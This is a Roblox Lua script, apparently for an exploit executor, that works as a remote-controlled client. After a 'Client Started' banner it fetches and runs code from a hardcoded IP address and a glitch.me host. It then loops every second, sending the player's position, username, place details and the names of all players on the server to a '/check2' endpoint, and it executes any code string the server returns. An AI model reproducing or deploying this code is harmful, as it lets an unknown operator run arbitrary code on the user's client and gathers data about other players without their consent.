if(_G.vv == nil) then
  _G.vv = 0
end
_G.vv = _G.vv + 1
local v = _G.vv






local glitch = false








_G.autoget = false
local marketplaceService = game:GetService("MarketplaceService")
function getname(id)
  return marketplaceService:GetProductInfo(id, Enum.InfoType.Asset).Name
end
local HttpService = game:GetService("HttpService")
function get(url)
  local res,ret
  return function()

    res = game:HttpGet(url)
    pcall(function()
      ret = HttpService:JSONDecode(res)
    end)
    return ret
  end
end

function get2(url,dataarr)
  local HttpService = game:GetService("HttpService")
  local data = ""
  for k, v in pairs(dataarr) do
  	data = data .. ("&%s=%s"):format(
  		HttpService:UrlEncode(k),
  		HttpService:UrlEncode(v)
  	)
  end
  data = data:sub(2)
  local res,ret
  return function()
    res = game:HttpGet(url.."?"..data)
    pcall(function()
      ret = HttpService:JSONDecode(res)
    end)
    return ret
  end
end




function split(self)
  splitresult = {}
  for i = 0, #self do
    splitresult[#splitresult + 1] = self:sub(i, i)
  end
  return splitresult
end

warn = function(text)
game:GetService('TestService'):Warn(false,"\n"..text,game,1)
end

warn([[
  ______   __  __                        __
 /      \ |  \|  \                      |  \
|  $$$$$$\| $$ \$$  ______   _______   _| $$_
| $$   \$$| $$|  \ /      \ |       \ |   $$ \
| $$      | $$| $$|  $$$$$$\| $$$$$$$\ \$$$$$$
| $$   __ | $$| $$| $$    $$| $$  | $$  | $$ __
| $$__/  \| $$| $$| $$$$$$$$| $$  | $$  | $$|  \
 \$$    $$| $$| $$ \$$     \| $$  | $$   \$$  $$
  \$$$$$$  \$$ \$$  \$$$$$$$ \$$   \$$    \$$$$





  ______     __                            __                      __
 /      \   |  \                          |  \                    |  \
|  $$$$$$\ _| $$_     ______    ______   _| $$_     ______    ____| $$
| $$___\$$|   $$ \   |      \  /      \ |   $$ \   /      \  /      $$
 \$$    \  \$$$$$$    \$$$$$$\|  $$$$$$\ \$$$$$$  |  $$$$$$\|  $$$$$$$
 _\$$$$$$\  | $$ __  /      $$| $$   \$$  | $$ __ | $$    $$| $$  | $$
|  \__| $$  | $$|  \|  $$$$$$$| $$        | $$|  \| $$$$$$$$| $$__| $$
 \$$    $$   \$$  $$ \$$    $$| $$         \$$  $$ \$$     \ \$$    $$
  \$$$$$$     \$$$$   \$$$$$$$ \$$          \$$$$   \$$$$$$$  \$$$$$$$



]])
if(glitch) then
loadstring(game:HttpGet("https://fog-delicate-gorilla.glitch.me/autoexecute"))()
else
loadstring(game:HttpGet("http://25.31.141.112:3000/autoexecute"))()
end
_G.autoget = true

local PlaceName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId, Enum.InfoType.Asset).Name

local res,pos
while wait(1) and _G.autoget and v == _G.vv do
  if(game.Players.LocalPlayer.Character) then
    if(game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")) then
      pos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
    else
      pos = Vector3.new(0,0,0)
    end
  else
    pos = Vector3.new(0,0,0)
  end
  x,y,z = pos.X,pos.Y,pos.Z
  spawn(function()
    playerlist = {}
    for i,v in pairs(game.Players:GetPlayers()) do
      playerlist[i] = v.Name
    end
    if(glitch) then
      url = "https://fog-delicate-gorilla.glitch.me/check2"
    else
      url = "http://25.31.141.112:3000/check2"
    end
    res = get2(url,{
      ["X"] = x,
      ["Y"] = y,
      ["Z"] = z,
      ["UserName"] = game.Players.LocalPlayer.Name,
      ["PlaceId"] = game.PlaceId,
      ["PlaceName"] = PlaceName,
      ["PlayersCurrently"] = #game.Players:GetPlayers(),
      ["Players"] = playerlist
    })()
    if(type(res) == type("string")) then
      if(_G.lastrun ~= res) then
        _G.lastrun = res
        loadstring(res)()
      end
    end
  end)
end
